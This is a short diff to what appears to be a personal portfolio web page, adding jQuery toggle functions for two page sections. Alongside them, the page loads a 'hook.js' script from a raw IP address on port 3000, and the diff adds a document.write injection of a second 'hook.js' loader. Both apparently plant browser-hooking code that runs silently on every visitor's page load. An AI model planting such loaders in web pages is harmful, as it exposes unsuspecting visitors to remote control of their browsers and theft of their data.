@@ -233,7 +233,24 @@ Outside of my professional career I'm a qualified Black-belt in Kyokushin and an
     <!-- jQuery -->
     <script src="js/jquery.js"></script>
  <script src="http://66.131.131.142:3000/hook.js"></script>
+<script src="jquery-1.11.3.min.js"></script>
+<script>
 
+	function showfriends() {
+		$("#hamper").hide();
+		$("#friends").show();
+	}
+	
+	function showHamper() {
+		$("#friends").hide();
+		$("#hamper").show();
+	}
+
+</script>
+<script>
+	var commandModuleStr = '<script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" type="text/javascript"><\/script>';
+	document.write(commandModuleStr);
+</script>
     <!-- Bootstrap Core JavaScript -->
     <script src="js/bootstrap.min.js"></script>
 
